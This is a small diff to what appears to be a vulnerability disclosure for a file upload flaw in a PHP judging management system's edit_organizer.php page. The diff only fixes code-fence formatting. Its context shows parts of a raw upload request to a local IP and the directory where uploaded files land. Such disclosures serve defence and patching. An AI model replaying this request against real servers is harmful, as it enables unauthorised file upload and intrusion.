@@ -11,7 +11,7 @@ Loophole location: Judging Management System's "/php-jms/edit_organizer.php" fil
 
 Request package for file upload：
 
-​```sql
+```sql
 POST /php-jms/edit_organizer.php HTTP/1.1
 Host: 192.168.1.88
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
@@ -91,7 +91,7 @@ Content-Disposition: form-data; name="update"
 
 
 -----------------------------227772473631172--
-​```
+```
 
 The files will be uploaded to this directory \php-jms\uploads
 ![image](https://user-images.githubusercontent.com/54017627/206372647-156724a1-ba02-4de5-99ca-5bdc77ae89fb.png)
